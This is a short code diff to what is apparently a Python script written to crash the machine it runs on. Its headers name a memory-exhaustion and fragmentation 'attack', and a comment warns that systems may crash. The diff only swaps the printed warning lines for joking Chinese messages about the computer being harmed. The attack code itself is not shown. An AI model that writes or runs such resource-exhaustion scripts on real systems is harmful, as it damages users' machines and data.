@@ -9,7 +9,7 @@ import multiprocessing
 from fcntl import ioctl
 
 # ===== 终极警告 =====
-print("[💣] Python 标准库版压力测试启动！5秒后系统可能崩溃...")
+print("🤔🤔你的電腦在5秒後會受到傷害")
 time.sleep(5)
 
 # ===== 1. 内存耗尽 + 碎片化攻击 =====
@@ -87,4 +87,4 @@ if __name__ == "__main__":
         except:
             pass  # 某些系统可能会直接崩溃
 
-    print("[🔥] 所有攻击启动！你電腦还能撑多久？")
+    print("太好了你還活著 也許你可以讓他在背景跑著哈哈")
